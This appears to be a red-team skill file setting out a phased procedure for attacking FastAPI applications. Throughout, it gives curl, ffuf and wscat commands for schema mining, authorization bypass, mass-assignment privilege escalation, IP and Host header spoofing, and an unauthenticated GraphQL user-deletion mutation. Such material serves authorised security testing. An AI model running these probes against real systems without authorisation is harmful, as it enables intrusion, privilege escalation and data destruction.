---
name: hunt-fastapi
description: Hunt FastAPI-specific vulnerabilities: dependency injection gaps, Pydantic coercion, and OpenAPI mining.
category: redteam
version: 1.0.0
author: uphiago
license: MIT
platforms: [linux]
compatibility: Requires curl, python3
metadata:
  tags: [redteam, fastapi, Python, ASGI, Pydantic, OpenAPI, dependency-injection]
  category: redteam
  related_skills:
    - hunt-sqli
    - hunt-api-misconfig
    - hunt-idor
    - web-enumeration
---

# FastAPI Security Hunting

Hunt FastAPI-specific vulnerabilities in dependency injection authorization gaps, Pydantic model coercion and extra field exploitation, OpenAPI schema mining for hidden endpoints, and ASGI middleware bypasses. FastAPI's design — dependency injection for auth, Pydantic for validation, OpenAPI auto-generation — creates unique attack surface distinct from Flask or Django.

## When to Use

- Target uses FastAPI (indicated by `/docs`, `/redoc`, `/openapi.json`, or `server: uvicorn`).
- OpenAPI schema is publicly accessible.
- API uses dependency injection (`Depends`) for authorization.
- WebSocket endpoints exist alongside REST API.
- Application uses Pydantic v1 or v2 for request validation.

## Quick Detection

```bash
# FastAPI fingerprinting
curl -sk "https://target.com/openapi.json" | jq '.info.title' 2>/dev/null
curl -sk "https://target.com/docs" -w "%{http_code}\n" -o /dev/null
curl -sk "https://target.com/redoc" -w "%{http_code}\n" -o /dev/null
```

## Procedure

### Phase 1 — OpenAPI Schema Mining

```bash
# Download full schema for endpoint discovery
curl -sk "https://target.com/openapi.json" | jq '.paths | keys[]'

# Find hidden endpoints not in docs
curl -sk "https://target.com/openapi.json" | jq '.paths | to_entries[] | select(.value.get != null and .value.get.security == []) | .key'

# Discover internal endpoints via path parameter fuzzing
ffuf -u "https://target.com/api/FUZZ" \
  -w /path/to/wordlist.txt \
  -mc 200,401,403 \
  -H "Accept: application/json"
```

### Phase 2 — Dependency Injection Authorization Gaps

```bash
# Depends vs Security — check if auth is actually enforced
curl -sk "https://target.com/api/admin/users"     # no auth
curl -sk "https://target.com/api/admin/users" \
  -H "Authorization: Bearer INVALID_TOKEN"         # invalid auth

# Dependency override in path operations
# Some endpoints may inherit Depends from router but override with None
for method in GET POST PUT PATCH DELETE; do
  curl -sk -X "$method" "https://target.com/api/users/1" \
    -w "$method — %{http_code}\n" -o /dev/null
done

# Background tasks added via BackgroundTasks may skip auth
curl -sk -X POST "https://target.com/api/orders" \
  -H "Content-Type: application/json" \
  -d '{"user_id":"VICTIM_ID","product":"test"}'
```

### Phase 3 — Pydantic Model Exploitation

```bash
# Type coercion — string "true" coerced to boolean
curl -sk -X POST "https://target.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","is_admin":"true"}'  # string coerced to bool

# Extra fields — Pydantic v1 ignores extra, v2 raises error by default
curl -sk -X POST "https://target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","role":"admin"}'  # extra field may be passed to DB

# Content-type switching
curl -sk -X POST "https://target.com/api/users" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'username=test&role=admin&is_superuser=true'
```

### Phase 4 — ASGI Middleware & Proxy Trust

```bash
# ProxyHeaders trust — if behind a proxy, spoof client IP
curl -sk "https://target.com/api/me" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1"

# TrustedHostMiddleware bypass
curl -sk "https://target.com/api/health" \
  -H "Host: evil.com"

# CORS middleware — test preflight bypass
curl -sk -X OPTIONS "https://target.com/api/users" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: DELETE"
```

### Phase 5 — WebSocket Auth Parity

```bash
# FastAPI WebSocket endpoints — auth may differ from REST
# Connect without token
wscat -c "wss://target.com/ws/notifications"

# Connect with minimal scope
wscat -c "wss://target.com/ws/admin" -H "Authorization: Bearer USER_TOKEN"

# Mounted sub-app WebSockets may skip middleware
wscat -c "wss://target.com/subapp/ws"
```

### Phase 6 — GraphQL Mount Authorization Gaps

```bash
# GraphQL mounted via starlette-graphene or strawberry-graphql
# May not enforce Depends at GraphQL resolver level
curl -sk -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'

# Mutations may work without auth even when queries require it
curl -sk -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { deleteUser(id: 1) { success } }"}'
```

## Pitfalls

- **Pydantic v2 `model_config` with `extra='ignore'` silently drops unknown fields.** Test both Pydantic v1 and v2 behavior.
- **OpenAPI schema may be restricted.** If `/openapi.json` returns 403, try `/docs` and `/redoc` which serve the same data.
- **FastAPI Depends with `Security` is NOT the same as `Depends`.** `Security` integrates with OpenAPI security schemes — but both can be misconfigured.
- **Uvicorn `--proxy-headers` must be enabled for IP spoofing to work.** Check with `X-Forwarded-For` — if the server sees your real IP, proxy headers are disabled.

## Verification

1. OpenAPI schema reveals endpoints not documented in the public API docs.
2. An endpoint with `Depends(get_current_user)` accepts requests without any Authorization header.
3. Pydantic type coercion accepts string values for boolean/integer fields and persists them.
4. WebSocket endpoint accepts connections without session authentication while the REST equivalent requires it.

## Related Skills

- **`hunt-api-misconfig`** — Broader API configuration issues including Swagger/OpenAPI exposure.
- **`hunt-idor`** — Object-level authorization gaps in FastAPI path parameters.
- **`web-enumeration`** — Directory and endpoint discovery through OpenAPI schema mining.
